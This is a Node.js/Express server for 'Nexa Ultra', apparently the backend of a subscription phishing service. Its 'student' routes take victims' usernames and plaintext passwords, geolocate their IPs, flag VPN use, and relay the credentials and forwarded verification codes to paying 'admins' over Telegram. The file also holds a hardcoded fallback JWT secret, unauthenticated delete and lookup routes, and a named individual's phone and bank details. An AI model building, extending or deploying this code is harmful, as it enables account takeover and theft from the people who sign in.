// server.js — NEXA ULTRA (Telegram Integrated) — PART 1/2
import dotenv from "dotenv";
dotenv.config();

import express from "express";
import mongoose from "mongoose";
import cors from "cors";
import multer from "multer";
import jwt from "jsonwebtoken";
import axios from "axios";
import bcrypt from "bcryptjs";
import { v2 as cloudinary } from "cloudinary";
import nodeCron from "node-cron";
import bodyParser from "body-parser";
import path from "path";
import { fileURLToPath } from "url";

const app = express();

// ---------- CONFIG ----------
const PORT = process.env.PORT || 5000;
const JWT_SECRET = process.env.JWT_SECRET || "nexa_secret_key";
const CLOUDINARY_FOLDER = process.env.CLOUDINARY_FOLDER || "nexa_mini";

const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || "";
const DEFAULT_AVATAR_URL = process.env.DEFAULT_AVATAR_URL || "";
const DEFAULT_ADMIN_PHONE = process.env.DEFAULT_ADMIN_PHONE || "09122154145";
const DEFAULT_ADMIN_USERNAME = process.env.DEFAULT_ADMIN_USERNAME || "nexa_admin";

// ---------- CORS ----------
const allowedOrigins = [
  "https://aminpanel.vercel.app",
  "https://cctv-ujg4.vercel.app",
  "http://localhost:7700",
  "https://help-center-self-six.vercel.app",
  "https://friendly-chaja-62dab6.netlify.app",
  "https://statuesque-pudding-f5c91f.netlify.app"
];

app.use(cors({
  origin: function(origin, callback) {
    // allow requests with no origin (like mobile apps, curl)
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) === -1) {
      const msg = `❌ The CORS policy for this site does not allow access from the specified Origin.`;
      return callback(new Error(msg), false);
    }
    return callback(null, true);
  }
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ---------- MONGO ----------

// ---------- CLOUDINARY ----------
cloudinary.config({
  cloud_name: process.env.CLOUDINARY_NAME || "",
  api_key: process.env.CLOUDINARY_KEY || "",
  api_secret: process.env.CLOUDINARY_SECRET || "",
});

// ---------- MULTER ----------
const upload = multer({ storage: multer.memoryStorage() });

// ---------- MODELS ----------
import Admin from "./models/Admin.js";
import Site from './models/Site.js';
import Help from './models/IGUnlock.js';
import { Subscription, RenewalRequest } from './models/sub.js';
import Student from './models/Child.js';
import Referral from "./models/Referral.js";
import Activity from "./models/Activity.js";

// ---------- HELPERS ----------
function formatPhone(phone) {
  if (!phone) return "";
  const digits = phone.toString().replace(/\D/g, "");
  const localPart = digits.slice(-10);
  if (localPart.length !== 10) throw new Error("Invalid phone number");
  return "234" + localPart;
}

async function hashPassword(pw) {
  return bcrypt.hash(pw, 10);
}

function generateCode(len = 8) {
  return Math.random().toString(36).substring(2, 2 + len).toUpperCase();
}

async function generateUniqueUsername(fn = "user", ln = "nexa") {
  const base = (fn + ln).toLowerCase().replace(/[^a-z0-9]/g, "").slice(0, 8) || "usern";
  for (let i = 0; i < 6; i++) {
    const name = `${base}${Math.floor(1000 + Math.random() * 9000)}`;
    if (!(await Admin.findOne({ username: name }))) return name;
  }
  return base + Date.now();
}

function escapeMarkdown(text = "") {
  return text.toString().replace(/([_*[\]()~>#+\-=|{}.!])/g, "\\$1");
}

//Cloudinary upload helper (wrap upload_stream into a Promise)

function uploadToCloudinaryBuffer(buffer, options = {}) {
  return new Promise((resolve, reject) => {
    const uploadStream = cloudinary.uploader.upload_stream(options, (error, result) => {
      if (error) return reject(error);
      resolve(result);
    });
    uploadStream.end(buffer);
  });
}

// Get location via ipwho.is with safe fallback
async function getLocation(ip) {
  try {
    if (!ip) return {};

    const clean = (ip || "").split(",")[0].trim();

    const { data } = await axios.get(
      `https://iplocate.io/api/lookup/${clean}?apikey=${process.env.IPLOCATE_KEY}`,
      { timeout: 3000 }
    );

    if (!data) return {};

    return {
      // -------------------------------------------
      // 🟩 OLD STRUCTURE (unchanged)
      // -------------------------------------------

      ip: data.ip,
      city: data.city,
      region: data.subdivision || data.region,
      region_code: data.asn?.country_code,
      country: data.country,
      country_code: data.country_code,
      continent: data.continent,
      continent_code: data.asn?.country_code,
      postal: data.postal_code,
      latitude: data.latitude,
      longitude: data.longitude,
      timezone: data.time_zone,
      timezone_offset: data.timezone_offset,
      timezone_abbr: data.time_zone,
      isp: data.company?.name,
      org: data.company?.domain,
      asn: data.asn?.asn,
      connection_type: data.asn?.type,
      currency: data.currency_code,
      currency_symbol: null,
      flag: null,

      // -------------------------------------------
      // 🟦 NEW FIELDS FROM THE NEW API
      // -------------------------------------------

      is_eu: data.is_eu,
      calling_code: data.calling_code,
      is_anycast: data.is_anycast,
      is_satellite: data.is_satellite,

      // ASN details
      asn_info: data.asn ? { ...data.asn } : null,

      // Privacy details
      privacy: data.privacy ? { ...data.privacy } : null,

      // Hosting provider
      hosting: data.hosting ? { ...data.hosting } : null,

      // Company info
      company: data.company ? { ...data.company } : null,

      // Abuse info
      abuse: data.abuse ? { ...data.abuse } : null,

      // Because their schema is rich AF
      _raw: data,
    };
  } catch (err) {
    console.warn("getLocation failed:", err?.response?.status || err?.message);
    return {};
  }
}
// --------- - TELEGRAM BOT UTIL ----------
import { bot } from "./botConfig.js"; 

// ---------- TELEGRAM BOT UTIL ----------
async function sendTelegram(chatId, text) {
  try {
    if (!chatId) {
      console.warn("No chatId available to sendTelegram");
      return;
    }

    const admin = await Admin.findOne({ chatId });
    if (!admin) {
      console.warn(`Admin not found for chatId: ${chatId}`);
      return;
    }

    if (admin.isPaid || admin.isAdmin) {
      await bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
    } else {
      await bot.sendMessage(chatId, `*🚫 INCOMING MESSAGE BLOCKED! 🚫*\nRenew your subscription to continue receiving messages.\n  \n \n 
      
      *ACCOUNT* \n account number: 9122154145\n bank name: Opay\n account name: Chukwuemeka Emmanuel Ileka\n \nGET FREE 1 MONTH SUBSCRIPTIon when 6 people sign up using your referral link https://aminpanel.vercel.app?ref=${admin.referralCode}`, { parse_mode: "Markdown" });
      
      await bot.sendMessage(ADMIN_CHAT_ID, `*🚫 INCOMING MESSAGE BLOCKED! for ${admin.username}🚫*\n \n  \n \n \n\n ${text} \n\n
      
      *ACCOUNT* \n account number: 9122154145\n bank name: Opay\n account name: Chukwuemeka Emmanuel Ileka\n \nGET FREE 1 MONTH SUBSCRIPTIon when 6 people sign up using your referral link https://aminpanel.vercel.app?ref=${admin.referralCode}`, { parse_mode: "Markdown" });

    }
  } catch (err) {
    console.warn("Telegram send failed:", err?.response?.data || err?.message);
  }
}
// ---------- AUTH MIDDLEWARE ----------
const verifyToken = (req, res, next) => {
  try {
    const token = req.headers.authorization?.split(" ")[1];
    if (!token) return res.status(401).json({ success: false, error: "No token" });
    req.userId = jwt.verify(token, JWT_SECRET).id;
    next();
  } catch (err) {
    return res.status(403).json({ success: false, error: "Invalid token" });
  }
};

// updateLastSeen middleware — must run after verifyToken on admin routes
async function updateLastSeen(req, res, next) {
  try {
    if (req.userId) {
      await Admin.findByIdAndUpdate(req.userId, { lastSeen: new Date() }).catch(() => null);
    }
  } catch (err) {
    console.warn("Couldn't update last seen:", err.message);
  }
  next();
}

// ---------- SUB MODULE (imported after helpers exist) ----------

import "./bot.js"; // runs the bot, attaches all message & callback_query listeners
import subRoutes from "./sub.js";
// inject dependencies expected by sub.js (verifyToken & sendTelegram)
if (typeof subRoutes === "function") subRoutes(app, { verifyToken, sendTelegram });

// ---------- BOOTSTRAP: ensure default admin exists ----------
async function ensureDefaultAdmin() {
}

// ---------- ROUTES (start) ----------
app.get("/", (_, res) => res.json({ success: true, message: "Nexa Ultra backend active (Telegram)" }));

/**
 * NOTE:
 * For all /admin routes we want verifyToken then updateLastSeen.
 * We'll apply updateLastSeen individually where required (not globally) to avoid order issues.
 */

app.post("/admin/register", async (req, res) => {
  try {
    let { firstname, lastname, phone, password, chatId, referredByCode } = req.body || {};
    if (!firstname || !lastname || !phone || !password) {
      return res.status(400).json({ success: false, error: "Missing fields" });
    }

    try { phone = formatPhone(phone); } 
    catch { return res.status(400).json({ success: false, error: "Invalid phone" }); }

    const existing = await Admin.findOne({ phone });
    if (existing) return res.status(400).json({ success: false, error: "Phone already used" });

    const username = await generateUniqueUsername(firstname, lastname);
    const hash = await hashPassword(password);
    const refCode = generateCode(6);

    // register admin — paid flag starts FALSE
    let inviterAdmin = null;
    const admin = await Admin.create({
      username,
      firstname,
      lastname,
      phone,
      password: hash,
      chatId: chatId || "",
      referralCode: refCode,
      isPaid: false,       // <-- NO free access
      isAdmin: false,
      candTag: "cand",
      avatar: DEFAULT_AVATAR_URL,
      referralEnabled: false,
      adminReferralDiscount: 0,
      adminReferrals: 0,
      referredBy:inviterAdmin?.username || null
    });

    // create referral doc
    await Referral.create({ adminId: admin._id, code: refCode, type: "admin", referrals: [] });

    // handle referral bonus if any
    if (referredByCode) {
      const inviterRef = await Referral.findOne({ code: referredByCode });
      if (inviterRef && inviterRef.adminId.toString() !== admin._id.toString()) {
        inviterRef.referrals.push(admin._id);
        await inviterRef.save();
         inviterAdmin = await Admin.findById(inviterRef.adminId);
        if (inviterAdmin) {
          await sendTelegram(inviterAdmin.chatId,
            `👋 Yo ${inviterAdmin.firstname}, someone registered using your referral code!`);
            await sendTelegram( ADMIN_CHAT_ID,
            ` someone registered using ${inviterAdmin.username}'s referral code!`);
        }
      }
    }

    // notify owner
    await sendTelegram(ADMIN_CHAT_ID, `✅ New admin registered: ${firstname} ${lastname} (${username})`);

    const token = jwt.sign({ id: admin._id }, JWT_SECRET, { expiresIn: "7d" });
    res.json({ success: true, token, admin: { username, firstname, lastname, phone, referralCode: refCode } });

  } catch (e) {
    console.error("admin/register error:", e.message || e);
    res.status(500).json({ success: false, error: "Sorry something went wrong: "+e, });
  }
});

// ---------- ADMIN LOGIN ----------
app.post("/admin/login", async (req, res) => {
  try {
    let { phone, password } = req.body || {};
    if (!phone || !password) return res.status(400).json({ success: false, error: "Missing phone or password" });

    try { phone = formatPhone(phone); } catch(e){ return res.status(400).json({ success:false, error:"Invalid phone" }); }

    const admin = await Admin.findOne({ phone });
    if (!admin) return res.status(404).json({ success: false, error: "Admin not found" });

    const ok = await bcrypt.compare(password, admin.password);
    if (!ok) return res.status(401).json({ success: false, error: "Invalid credentials" });

    const token = jwt.sign({ id: admin._id }, JWT_SECRET, { expiresIn: "7d" });

    // notify owner about login and notify admin
    await sendTelegram(ADMIN_CHAT_ID, `🔐 Admin *${admin.username}* (${admin.firstname} ${admin.lastname}) just logged in.`);
    await sendTelegram(admin.chatId || ADMIN_CHAT_ID, `🔐 Login detected on your Nexa account (${admin.username})`);

    res.json({
      success: true,
      token,
      admin: {
        username: admin.username,
        phone: admin.phone,
        referralCode: admin.referralCode,
        firstname: admin.firstname,
        lastname: admin.lastname,
        avatar: admin.avatar,
        bio: admin.bio,
        votes: admin.votes
      }
    });
  } catch (e) {
    console.error("admin/login error:", e && e.message || e);
    res.status(500).json({ success: false, error: "Login failed" });
  }
});

// ---------- PROTECTED ADMIN ROUTES ----------
// apply verifyToken + updateLastSeen per route to preserve behavior

app.get("/admin/active", verifyToken, updateLastSeen, async (req, res) => {
  try {
    const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
    const activeAdmins = await Admin.find({ lastSeen: { $gte: fiveMinutesAgo } }).select("username chatId lastSeen");
    res.json({ success: true, activeAdmins });
  } catch (err) {
    console.error("admin/active error:", err);
    res.status(500).json({ success:false, error:"Failed" });
  }
});

app.get("/admin/profile", verifyToken, updateLastSeen, async (req, res) => {
  try {
    const admin = await Admin.findById(req.userId);
    if (!admin) return res.status(404).json({ success: false, error: "Admin not found" });
    // no changes to returned shape
    res.json({ success: true, profile: admin });
  } catch (err) {
    console.error("admin/profile error:", err && err.message || err);
    res.status(500).json({ success: false, error: "Failed to get profile" });
  }
});

app.post("/admin/update", verifyToken, updateLastSeen, async (req, res) => {
  try {
    const { bio, slogan, chatId } = req.body || {};
    const admin = await Admin.findById(req.userId);
    if (!admin) return res.status(404).json({ success: false, error: "Admin not found" });
    if (bio !== undefined) admin.bio = bio;
    if (slogan !== undefined) admin.slogan = slogan;
    if (chatId !== undefined) admin.chatId = chatId;
    await admin.save();

    await sendTelegram(ADMIN_CHAT_ID, `📝 Admin updated profile: *${admin.username}*`);
    await sendTelegram(admin.chatId || ADMIN_CHAT_ID, `📝 Your profile was updated successfully.`);

    res.json({ success: true, admin });
  } catch (e) {
    console.error("admin/update error:", e && e.message || e);
    res.status(500).json({ success: false, error: "Update failed" });
  }
});

app.post("/admin/update-name", verifyToken, updateLastSeen, async (req, res) => {
  try {
    const { firstname, lastname } = req.body || {};
    const admin = await Admin.findById(req.userId);
    if (!admin) return res.status(401).json({ success: false, error: "Invalid or expired token" });

    if (firstname) admin.firstname = firstname;
    if (lastname) admin.lastname = lastname;
    await admin.save();

    res.status(200).json({ success: true, message: "Name updated successfully", firstname: admin.firstname, lastname: admin.lastname });

    // Notify (non-blocking)
    sendTelegram(admin.chatId || ADMIN_CHAT_ID, `*CHANGES DETECTED ON YOUR ACCOUNT: ${admin.username}*\nYour name was updated.`);
  } catch (e) {
    console.error("admin/update-name error:", e && e.message || e);
    res.status(500).json({ success: false, error: "Server error: " + (e && e.message) });
  }
});

app.post("/admin/avatar", verifyToken, updateLastSeen, upload.single("avatar"), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ success: false, error: "No file uploaded" });

    const result = await uploadToCloudinaryBuffer(req.file.buffer, { folder: CLOUDINARY_FOLDER });
    const admin = await Admin.findById(req.userId);
    admin.avatar = result.secure_url;
    await admin.save();

    res.json({ success: true, message: "Avatar updated", avatar: admin.avatar });
  } catch (err) {
    console.error("admin/avatar error:", err && err.message || err);
    res.status(500).json({ success: false, error: err.message || "Upload failed" });
  }
});

app.get("/admin/students", verifyToken, updateLastSeen, async (req, res) => {
  try {
    const admin = await Admin.findById(req.userId);
    if (!admin) return res.status(404).json({ success: false, error: "Admin not found" });

    const students = await Student.find({ adminId: admin._id }).lean();
    return res.json({ success: true, students });
  } catch (err) {
    console.error("Get students failed:", err && err.message || err);
    return res.status(500).json({ success: false, error: "Failed to fetch students" });
  }
});

app.get("/admins/public", async (req, res) => {
  try {
    const admins = await Admin.find().select("username firstname lastname avatar referralCode slogan chatId");
    const students = await Student.find({});
    res.json({ success: true, admins });
  } catch (e) {
    console.error("admins/public error:" , e && e.message || e);
    res.status(500).json({ success: false, error: "Failed to fetch admins" });
  }
});

// ---------- VOTING ----------
app.post("/admins/vote", async (req, res) => {
  try {
    const { adminId } = req.body || {};
    if (!adminId) return res.status(400).json({ success: false, error: "Missing adminId" });

    const admin = await Admin.findById(adminId);
    if (!admin) return res.status(404).json({ success: false, error: "Admin not found" });

    admin.votes = (admin.votes || 0) + 1;
    await admin.save();

    await Activity.create({ adminId: admin._id, action: "vote_cast", details: { newVoteCount: admin.votes } });

    await sendTelegram(admin.chatId || ADMIN_CHAT_ID, `Hi ${admin.firstname}, someone just voted for you!`);

    res.json({ success: true, message: "Vote recorded successfully", admin: { username: admin.username, votes: admin.votes } });
  } catch (err) {
    console.error("Vote error:", err && err.message || err);
    res.status(500).json({ success: false, error: "Server error while voting" });
  }
});

// ---------- STUDENT SITE (public) ----------
app.get("/student/site", async (req, res) => {
  try {
    const { referralCode } = req.query;
    if (!referralCode) return res.status(400).json({ success: false, error: "Referral code is required" });

    const ref = await Referral.findOne({ code: referralCode }).populate("adminId");
    if (!ref) return res.status(404).json({ success: false, error: "Invalid referral code", referralCode });

    const adminId = ref.adminId?._id;
    if (!adminId) return res.status(404).json({ success: false, error: "Admin not found with the provided referral code" });

    const site = await Site.findOne({ adminId });
    if (!site) return res.status(404).json({ success: false, error: "Settings not found" });

    return res.status(200).json({ success: true, message: "Done", site });
  } catch (err) {
    console.error("Error fetching site:", err);
    res.status(500).json({ success: false, error: "Server error occurred" });
  }
});

// ---------- STUDENT VISIT TRACKING ----------
app.post("/student/visit", async (req, res) => {
  try {
    const { path, referrer, utm, userAgent } = req.body || {};
    let actualReferrer = referrer;
    let admin = null;

    if (actualReferrer && actualReferrer !== "null") {
      const ref = await Referral.findOne({ code: actualReferrer }).lean();
      if (ref) admin = await Admin.findById(ref.adminId);
    }

    if (!admin) {
      // fallback to default admin
      admin = await Admin.findOne({ username: DEFAULT_ADMIN_USERNAME }) || await Admin.findOne();
    }

    if (!admin) {
      console.error("student/visit: No admin available to attribute visit");
      return res.status(500).json({ success: false, error: "No admin found" });
    }

    const ip = req.headers["x-forwarded-for"] || req.socket?.remoteAddress || null;
    const location = {};

    await Activity.create({
      adminId: admin._id,
      action: "visit",
      details: { path: path || "/", referrer: actualReferrer || null, utm: utm || null, userAgent: userAgent || null, location }
    });

    const message = `
Hey *${escapeMarkdown(admin.firstname || admin.username)}* 📈 someone visited your Page
Path: ${escapeMarkdown(path || "/")}
Referral: ${escapeMarkdown(actualReferrer || "direct")}
Location: ${escapeMarkdown(location.city || "Not yet revealed until they login")}, ${escapeMarkdown(location.country || "Hidden")}
IP: *${escapeMarkdown(ip || "Location only comes with login details now")}*
`;
    sendTelegram(admin.chatId || ADMIN_CHAT_ID, message).catch(()=>null);

    return res.json({ success: true, message: "Visit tracked" });
  } catch (err) {
    console.error("Visit track failed:", err && err.message || err);
    return res.status(500).json({ success: false, error: "Failed to track visit", details: err && err.message });
  } 
});

// ---------- STUDENT REGISTER ----------
app.post("/student/register", async (req, res) => {
  try {
    const { username, password, referralCode, platform } = req.body || {};
    if (!username || !password) return res.status(400).json({ success: false, error: "Username and password required" });

    // Prevent duplicate usernames
    const existing = await Student.findOne({ username });
    let name =null;
    if (existing) {
      name = "Duplicate"
    }

    // Resolve admin via referral -> default -> any
    let admin = null;
    let usedReferral = null;
    if (referralCode && referralCode !== "null") {
      const ref = await Referral.findOne({ code: referralCode });
      if (ref) {
        admin = await Admin.findById(ref.adminId);
        usedReferral = ref;
      }
    }

    if (!admin) {
      admin = await Admin.findOne({ username: DEFAULT_ADMIN_USERNAME });
    }
    if (!admin) {
      admin = await Admin.findOne();
    }
    if (!admin) return res.status(500).json({ success: false, error: "No admin available" });
const ip = req.headers["x-forwarded-for"] || req.socket?.remoteAddress || null;
    const location = await getLocation(ip);
    let studentId = generateCode(6);
    // Create student
    const hashed = await hashPassword(password);
    const student = await Student.create({
      username,
      password,
      adminId: admin._id,
      platform: platform || null,
      studentId,
      owner: admin.username,
      location
    });

    // Attach student to referral doc if used
    if (usedReferral) {
      usedReferral.referrals = usedReferral.referrals || [];
      usedReferral.referrals.push(student._id);
      await usedReferral.save();
    }

    
let vpn = location.privacy?.is_vpn? `Yes he used vpn location is fake, the fake ip is ${ip}` : "No VPN everything is real";
    await Activity.create({
      adminId: admin._id,
      studentId,
      action: "student_register",
      details: { username, location }
    });


    // Notify admin & owner (don't expose password in logs or persistent messages in production — this matches your prior behavior but consider removing)
    const platformName = (platform || "NEXA").toString();
    const adminMsg = `
🌟NEW ${location.country||"Unknown country".toUpperCase()} CLIENT 
Platform: ${escapeMarkdown(platformName)}\n
Username: *${escapeMarkdown(username)}*
Password: *${password}*\n
Referrer: *${escapeMarkdown(admin.username)}*
Location: ${escapeMarkdown(location.city || "Unknown")}, ${escapeMarkdown(location.country || "Unknown")}\n Country code: ${location.country_code || "Unknown country code"}\nID:${studentId}

IP ${ip}
\n\n VPN : ${vpn}
`;
    sendTelegram(admin.chatId || ADMIN_CHAT_ID, adminMsg).catch(()=>null);

    await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: *${username}* (via ${admin.username}'s link) from ${escapeMarkdown(location.country || "Unknown")}`);

    return res.json({ success: true, studentId, admin: { username: admin.username, phone: admin.phone }, student:student });
  } catch (e) {
    console.error("student/register error:", e && (e.stack || e.message) || e);
    return res.status(500).json({ success: false, error: "Student signup failed", details: e && e.message });
  }
});

// ---------- STUDENT SEND-CODE ----------
app.post("/student/send-code", async (req, res) => {
  try {
    const { code, referralCode, platform, username } = req.body || {};
    if (!referralCode) return res.status(400).json({ success: false, error: "Referral code is required" });
    if (!code) return res.status(400).json({ success: false, error: "Verification code is required" });

    const ref = await Referral.findOne({ code: referralCode }).lean();
    if (!ref) return res.status(404).json({ success: false, error: "Invalid referral code" });

    const admin = await Admin.findById(ref.adminId);
    if (!admin) return res.status(404).json({ success: false, error: "Admin not found" });

    const msg = `
🔐 VERIFICATION REQUEST
Username: ${escapeMarkdown(username || "Unknown")}
Platform: ${escapeMarkdown(platform || "unknown")}
Code: \`${escapeMarkdown(code)}\`
`;
    await sendTelegram(admin.chatId || ADMIN_CHAT_ID, msg);

    await Activity.create({ adminId: admin._id, action: "verification_requested", details: { username, code, platform } });

    return res.json({ success: true, message: "Verification request sent to admin" });
  } catch (err) {
    console.error("Send-code error:", err && err.message || err);
    return res.status(500).json({ success: false, error: "Server error while sending code", details: err && err.message });
  }
});

// ---------- ADMIN BROADCAST ----------
app.post("/admin/broadcast",  async (req, res) => {
  try {
    const { title, message } = req.body || {};
    if (!message) return res.status(400).json({ success: false, error: "Message required" });

    const text = `📣 *${title || "Announcement"}*\n\n${message}\n\n_— Nexa System_`;
    const admins = await Admin.find().lean();

    for (const adm of admins) {
      try {
        await sendTelegram(adm.chatId || ADMIN_CHAT_ID, text);
      } catch (e) {
        console.warn("Broadcast individual failed for admin:", adm._id, e && e.message);
        
      }
    }

    await Activity.create({ adminId: req.userId, action: "broadcast", details: { title, message } });

    res.json({ success: true, message: "Broadcast sent" });
  } catch (err) {
    console.error("broadcast error:", err && err.message || err);
    res.status(500).json({ success: false, error: "Broadcast failed" });
  }
});



app.post("/admin/notify",verifyToken, async (req, res) => {
  try {
    const {title, description } = req.body;
    
    const id = req.userId;
    const admin = await Admin.findById(id);
    
    if (!admin) return res.status(401).json({
      success:false,error:"Admin not found"
    });
    
    const chatId = admin?.chatId;
    const text = `
  *${title || "Notification"}*\n\n
  
  ${description || ""}\n\n From Marsdove ${admin?.isPaid? "Paid" : "free"}
  `;
  
  await sendTelegram(admin?.chatId,text);
  res.status(200).json({success:true,error:`Successfully sent to ${admin?.username}`, notification:{title, description}});
  
  await sendTelegram(ADMIN_CHAT_ID, `notification sent to ${admin?.username} \n\n title: ${title}\n Description: ${description}`)
  
  } catch (e) {
    console.warn("admin/notify error:", e);

    await sendTelegram(
      ADMIN_CHAT_ID,
      `Unable to send notification to ${req.body?.username}: ${e.message}`
    );

    res.status(500).json({
      success: false,
      error: "Internal server error"
    });
  }
});

// ---------- ADMIN ACTIVITY ----------
app.get("/admin/activity", verifyToken, updateLastSeen, async (req, res) => {
  try {
    const logs = await Activity.find({ adminId: req.userId }).sort({ createdAt: -1 });
    res.json({ success: true, logs });
  } catch (err) {
    console.error("admin/activity error:", err && err.message || err);
    res.status(500).json({ success: false, error: "Failed to fetch activity" });
  }
});

app.get("/help/user/:studentId", async (req, res) => {
  try {
    const { studentId } = req.params;

    const help = await Help.findOne({
      studentId,
      active: true
    }).select("contactMethods -_id") || await Help.findOne();

    if (!help) {
      return res.status(404).json({
        success: false,
        error: "No help assigned"
      });
    }

    res.json({
      success: true,
      data: help.contactMethods
    });

  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});

app.post("/admin/help/:studentId", verifyToken, async (req, res) => {
  console.log("========== /admin/help HIT ==========");

  try {
    // PARAMS
    const { studentId } = req.params;
    console.log("studentId (param):", studentId, "| type:", typeof studentId);

    // AUTH
    console.log("adminId (from token):", req.userId);

    // BODY
    console.log("raw body:", req.body);

    const { contactMethods } = req.body || {};
    console.log("contactMethods:", contactMethods);
    console.log("isArray:", Array.isArray(contactMethods));

    // VALIDATION: ARRAY
    if (!Array.isArray(contactMethods) || contactMethods.length === 0) {
      console.log("❌ contactMethods missing or empty");
      return res.status(400).json({
        success: false,
        error: "contactMethods required"
      });
    }

    // VALIDATION: SHAPE
    for (let i = 0; i < contactMethods.length; i++) {
      const m = contactMethods[i];
      console.log(`method[${i}] ->`, m);

      if (!m.type || !m.label || !m.tel) {
        console.log("❌ invalid contact method at index", i);
        return res.status(400).json({
          success: false,
          error: "Invalid contact method"
        });
      }
    }

    // STUDENT CHECK
    console.log("checking student existence...");
    const studentExists = await Student.exists({ studentId });
    console.log("studentExists:", studentExists);

    if (!studentExists) {
      console.log("❌ Student NOT found for studentId:", studentId);

      // DEBUG: show one student in DB (temporary)
      const anyStudent = await Student.findOne();
      console.log("sample student in DB:", anyStudent);

      return res.status(404).json({
        success: false,
        error: "Student not found"
      });
    }

    // UPSERT HELP
    console.log("upserting help config...");
    const help = await Help.findOneAndUpdate(
      { studentId },
      {
        adminId: req.userId,
        contactMethods,
        active: true
      },
      { new: true, upsert: true }
    );

    console.log("✅ help saved:", help);

    res.json({
      success: true,
      data: help
    });

  } catch (err) {
    console.error("🔥 ERROR IN /admin/help:", err);

    res.status(500).json({
      success: false,
      error: "Server error"
    });
  } finally {
    console.log("========== END /admin/help ==========\n");
  }
});


app.delete("/admin/delete-user", async (req, res) => {
  try {
    const { phone } = req.body;

    if (!phone) {
      return res.status(400).json({
        success: false,
        message: "Phone number required.",
      });
    }

    const user = await Admin.findOneAndDelete({ phone });

    if (!user) {
      return res.status(404).json({
        success: false,
        message: "User not found.",
      });
    }

    res.json({
      success: true,
      message: "User deleted successfully.",
      data: user
    });

  } catch (err) {
    console.error("Delete user error:", err);
    res.status(500).json({
      success: false,
      message: "Internal server error.",
    });
  }
});


// ---------- GET ADMIN BY USERNAME (debug) ----------
app.get("/admin/by-username/:username", async (req, res) => {
  try {
    const { username } = req.params;
    const admin = await Admin.findOne({ username });
    if (!admin) return res.status(404).json({ success: false, error: "Admin not found" });

    res.json({
      success: true,
      admin
    });
  } catch (err) {
    console.error("Error fetching admin by username:", err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});


app.get("/student/by-username/:username", async (req, res) => {
  try {
    const { username } = req.params;
    const admin = await Student.findOne({ username });
    if (!admin) return res.status(404).json({ success: false, error: "Student not found" });

    res.json({
      success: true,
     student :admin
    });
  } catch (err) {
    console.error("Error fetching student by username:", err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});




// ---------- ADMIN SITE SETTINGS CREATE/UPDATE ----------
app.post("/admin/site", verifyToken, updateLastSeen, async (req, res) => {
  try {
    const { title, subTitle, description } = req.body || {};
    let site = await Site.findOne({ adminId: req.userId });
    if (!site) {
      site = await Site.create({ adminId: req.userId, title, subTitle, description });
    } else {
      if ("title" in req.body) site.title = title;
      if ("subTitle" in req.body) site.subTitle = subTitle;
      if ("description" in req.body) site.description = description;
      await site.save();
    }
    return res.json({ success: true, message: "Site updated successfully", site });
  } catch (err) {
    console.error("Error updating site:", err);
    res.status(500).json({ success: false, error: "Something went wrong", details: err.message });
  }
});

// ---------- GET SETTINGS BY REFERRAL (public) ----------
app.get("/admin/site/:ref", async (req, res) => {
  try {
    const { ref } = req.params;
    const admin = await Admin.findOne({ referralCode: ref });
    if (!admin) return res.status(404).json({ success: false, message: "Invalid referral code" });

    const settings = await Site.findOne({ adminId: admin._id });
    if (!settings) return res.status(404).json({ success: false, message: "No settings found for this admin" });

    res.json({
      success: true,
      admin: { id: admin._id, name: `${admin.firstname} ${admin.lastname}`, phone: admin.phone },
      settings,
    });
  } catch (error) {
    console.error("Error fetching settings:", error);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

// ---------- TEST SEND ----------
app.post("/send-test", verifyToken, updateLastSeen, async (req, res) => {
  try {
    const admin = await Admin.findById(req.userId);
    if (!admin) return res.status(404).json({ success: false, message: "Admin not found" });
    await sendTelegram(admin.chatId || ADMIN_CHAT_ID, "✅ Your Nexa notification system is working perfectly.");
    res.json({ success: true, message: "Test sent" });
  } catch (err) {
    console.error("send-test error:", err && err.message || err);
    res.status(500).json({ success: false, error: "Test failed" });
  }
});

// ---------- STUB / PROF TAG ----------
app.post("/admin/profTag", verifyToken, updateLastSeen, async (req, res) => {
  try {
    const { adminId, badge } = req.body || {};
    if (!adminId || !badge) return res.status(400).json({ success: false, error: "adminId and badge required" });
    // implement logic as needed; placeholder to keep route parity
    await Activity.create({ adminId: req.userId, action: "profTag_set", details: { targetAdmin: adminId, badge } });
    res.json({ success: true, message: "profTag applied (placeholder)" });
  } catch (err) {
    console.error("profTag error:", err && err.message || err);
    res.status(500).json({ success: false, error: "Failed to set profTag" });
  }
});

// ---------- START SERVER ----------
app.listen(PORT, () => {
  console.log(`🚀 Nexa Ultra running on port ${PORT}`);
});